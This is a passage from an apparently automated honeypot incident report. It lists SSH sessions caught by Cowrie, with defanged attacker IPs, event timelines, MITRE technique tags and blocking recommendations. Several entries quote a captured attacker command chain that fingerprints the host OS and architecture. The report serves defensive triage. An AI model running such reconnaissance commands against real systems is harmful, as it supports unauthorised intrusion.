| `2026-07-08 03:21:28` | `cowrie.session.connect` |
| `2026-07-08 03:21:29` | `cowrie.client.version` |
| `2026-07-08 03:21:29` | `cowrie.client.kex` |
| `2026-07-08 03:21:31` | `cowrie.login.success` |
| `2026-07-08 03:21:32` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0246daed894

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 03:21 |
| **Last Seen** | 2026-07-08 03:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:21:30` | `cowrie.session.connect` |
| `2026-07-08 03:21:30` | `cowrie.client.version` |
| `2026-07-08 03:21:30` | `cowrie.client.kex` |
| `2026-07-08 03:21:31` | `cowrie.login.success` |
| `2026-07-08 03:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6427cbe2b9f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-08 03:21 |
| **Last Seen** | 2026-07-08 03:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:21:31` | `cowrie.session.connect` |
| `2026-07-08 03:21:31` | `cowrie.client.version` |
| `2026-07-08 03:21:31` | `cowrie.client.kex` |
| `2026-07-08 03:21:32` | `cowrie.login.success` |
| `2026-07-08 03:21:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4174412fad82

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:22 |
| **Last Seen** | 2026-07-08 03:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:22:08` | `cowrie.session.connect` |
| `2026-07-08 03:22:08` | `cowrie.client.version` |
| `2026-07-08 03:22:08` | `cowrie.client.kex` |
| `2026-07-08 03:22:09` | `cowrie.login.success` |
| `2026-07-08 03:22:11` | `cowrie.session.params` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.success` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.command.input` |
| `2026-07-08 03:22:11` | `cowrie.log.closed` |
| `2026-07-08 03:22:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5925aaab23da

| Field | Detail |
|---|---|
| **Source IP** | `59.34.17[.]130` |
| **First Seen** | 2026-07-08 03:22 |
| **Last Seen** | 2026-07-08 03:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:22:28` | `cowrie.session.connect` |
| `2026-07-08 03:22:28` | `cowrie.client.version` |
| `2026-07-08 03:22:28` | `cowrie.client.kex` |
| `2026-07-08 03:22:30` | `cowrie.login.success` |
| `2026-07-08 03:22:31` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:22:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.34.17[.]130` to AbuseIPDB if not already reported
- [ ] Block `59.34.17[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e494099af4

| Field | Detail |
|---|---|
| **Source IP** | `196.190.180[.]18` |
| **First Seen** | 2026-07-08 03:22 |
| **Last Seen** | 2026-07-08 03:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:22:37` | `cowrie.session.connect` |
| `2026-07-08 03:22:37` | `cowrie.client.version` |
| `2026-07-08 03:22:37` | `cowrie.client.kex` |
| `2026-07-08 03:22:38` | `cowrie.login.success` |
| `2026-07-08 03:22:39` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.190.180[.]18` to AbuseIPDB if not already reported
- [ ] Block `196.190.180[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39f35ab127c4

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-07-08 03:23 |
| **Last Seen** | 2026-07-08 03:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:23:47` | `cowrie.session.connect` |
| `2026-07-08 03:23:47` | `cowrie.client.version` |
| `2026-07-08 03:23:47` | `cowrie.client.kex` |
| `2026-07-08 03:23:49` | `cowrie.login.success` |
| `2026-07-08 03:23:50` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:23:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dc423dd5191

| Field | Detail |
|---|---|
| **Source IP** | `50.217.40[.]11` |
| **First Seen** | 2026-07-08 03:23 |
| **Last Seen** | 2026-07-08 03:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:23:55` | `cowrie.session.connect` |
| `2026-07-08 03:23:55` | `cowrie.client.version` |
| `2026-07-08 03:23:55` | `cowrie.client.kex` |
| `2026-07-08 03:23:57` | `cowrie.login.success` |
| `2026-07-08 03:23:57` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:24:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.217.40[.]11` to AbuseIPDB if not already reported
- [ ] Block `50.217.40[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d34562293e4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:24 |
| **Last Seen** | 2026-07-08 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:24:07` | `cowrie.session.connect` |
| `2026-07-08 03:24:07` | `cowrie.client.version` |
| `2026-07-08 03:24:07` | `cowrie.client.kex` |
| `2026-07-08 03:24:09` | `cowrie.login.success` |
| `2026-07-08 03:24:10` | `cowrie.session.params` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.success` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.command.input` |
| `2026-07-08 03:24:10` | `cowrie.log.closed` |
| `2026-07-08 03:24:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69e0b2dc1fd8

| Field | Detail |
|---|---|
| **Source IP** | `62.182.118[.]138` |
| **First Seen** | 2026-07-08 03:24 |
| **Last Seen** | 2026-07-08 03:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:24:22` | `cowrie.session.connect` |
| `2026-07-08 03:24:23` | `cowrie.client.version` |
| `2026-07-08 03:24:23` | `cowrie.client.kex` |
| `2026-07-08 03:24:24` | `cowrie.login.success` |
| `2026-07-08 03:24:24` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.182.118[.]138` to AbuseIPDB if not already reported
- [ ] Block `62.182.118[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e86996cb9aa8

| Field | Detail |
|---|---|
| **Source IP** | `187.218.57[.]50` |
| **First Seen** | 2026-07-08 03:24 |
| **Last Seen** | 2026-07-08 03:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:24:34` | `cowrie.session.connect` |
| `2026-07-08 03:24:35` | `cowrie.client.version` |
| `2026-07-08 03:24:35` | `cowrie.client.kex` |
| `2026-07-08 03:24:36` | `cowrie.login.success` |
| `2026-07-08 03:24:37` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.218.57[.]50` to AbuseIPDB if not already reported
- [ ] Block `187.218.57[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effaf4e7cba0

| Field | Detail |
|---|---|
| **Source IP** | `185.65.238[.]250` |
| **First Seen** | 2026-07-08 03:24 |
| **Last Seen** | 2026-07-08 03:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:24:50` | `cowrie.session.connect` |
| `2026-07-08 03:24:50` | `cowrie.client.version` |
| `2026-07-08 03:24:50` | `cowrie.client.kex` |
| `2026-07-08 03:24:51` | `cowrie.login.success` |
| `2026-07-08 03:24:51` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.65.238[.]250` to AbuseIPDB if not already reported
- [ ] Block `185.65.238[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d1ba0eb56c

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:25 |
| **Last Seen** | 2026-07-08 03:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:25:49` | `cowrie.session.connect` |
| `2026-07-08 03:25:49` | `cowrie.client.version` |
| `2026-07-08 03:25:49` | `cowrie.client.kex` |
| `2026-07-08 03:25:49` | `cowrie.login.success` |
| `2026-07-08 03:25:50` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:25:50` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15dc11e9c80e

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:25 |
| **Last Seen** | 2026-07-08 03:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:25:50` | `cowrie.session.connect` |
| `2026-07-08 03:25:50` | `cowrie.client.version` |
| `2026-07-08 03:25:50` | `cowrie.client.kex` |
| `2026-07-08 03:25:51` | `cowrie.login.success` |
| `2026-07-08 03:25:51` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:25:51` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2905541a5d

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:25 |
| **Last Seen** | 2026-07-08 03:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:25:53` | `cowrie.session.connect` |
| `2026-07-08 03:25:53` | `cowrie.client.version` |
| `2026-07-08 03:25:54` | `cowrie.client.kex` |
| `2026-07-08 03:25:54` | `cowrie.login.success` |
| `2026-07-08 03:25:54` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:25:54` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d9938798cc0

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]245` |
| **First Seen** | 2026-07-08 03:26 |
| **Last Seen** | 2026-07-08 03:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:26:09` | `cowrie.session.connect` |
| `2026-07-08 03:26:09` | `cowrie.client.version` |
| `2026-07-08 03:26:09` | `cowrie.client.kex` |
| `2026-07-08 03:26:13` | `cowrie.login.success` |
| `2026-07-08 03:26:14` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]245` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620cd0058e64

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]150` |
| **First Seen** | 2026-07-08 03:26 |
| **Last Seen** | 2026-07-08 03:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:26:11` | `cowrie.session.connect` |
| `2026-07-08 03:26:11` | `cowrie.client.version` |
| `2026-07-08 03:26:11` | `cowrie.client.kex` |
| `2026-07-08 03:26:13` | `cowrie.login.success` |
| `2026-07-08 03:26:14` | `cowrie.session.params` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.success` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:14` | `cowrie.command.input` |
| `2026-07-08 03:26:15` | `cowrie.log.closed` |
| `2026-07-08 03:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]150` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9da767df5472

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:06` | `cowrie.session.connect` |
| `2026-07-08 03:27:06` | `cowrie.client.version` |
| `2026-07-08 03:27:06` | `cowrie.client.kex` |
| `2026-07-08 03:27:07` | `cowrie.login.success` |
| `2026-07-08 03:27:07` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:27:07` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91ff3492c1fb

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:10` | `cowrie.session.connect` |
| `2026-07-08 03:27:10` | `cowrie.client.version` |
| `2026-07-08 03:27:10` | `cowrie.client.kex` |
| `2026-07-08 03:27:10` | `cowrie.login.success` |
| `2026-07-08 03:27:11` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:27:11` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9cc712386ac

| Field | Detail |
|---|---|
| **Source IP** | `223.210.27[.]53` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:11` | `cowrie.session.connect` |
| `2026-07-08 03:27:11` | `cowrie.client.version` |
| `2026-07-08 03:27:11` | `cowrie.client.kex` |
| `2026-07-08 03:27:13` | `cowrie.login.success` |
| `2026-07-08 03:27:14` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.210.27[.]53` to AbuseIPDB if not already reported
- [ ] Block `223.210.27[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc677fbd30de

| Field | Detail |
|---|---|
| **Source IP** | `35.241.189[.]214` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:13` | `cowrie.session.connect` |
| `2026-07-08 03:27:13` | `cowrie.login.success` |
| `2026-07-08 03:27:14` | `cowrie.session.params` |
| `2026-07-08 03:27:14` | `cowrie.command.input` |
| `2026-07-08 03:27:14` | `cowrie.command.input` |
| `2026-07-08 03:27:14` | `cowrie.command.failed` |
| `2026-07-08 03:27:14` | `cowrie.command.input` |
| `2026-07-08 03:27:14` | `cowrie.log.closed` |
| `2026-07-08 03:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.241.189[.]214` to AbuseIPDB if not already reported
- [ ] Block `35.241.189[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a20bdb3edc2

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]39` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:15` | `cowrie.session.connect` |
| `2026-07-08 03:27:15` | `cowrie.client.version` |
| `2026-07-08 03:27:15` | `cowrie.client.kex` |
| `2026-07-08 03:27:15` | `cowrie.login.success` |
| `2026-07-08 03:27:16` | `cowrie.direct-tcpip.request` |
| `2026-07-08 03:27:16` | `cowrie.direct-tcpip.data` |
| `2026-07-08 03:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]39` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387a42861ea8

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-07-08 03:27 |
| **Last Seen** | 2026-07-08 03:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 03:27:19` | `cowrie.session.connect` |
| `2026-07-08 03:27:20` | `cowrie.client.version` |
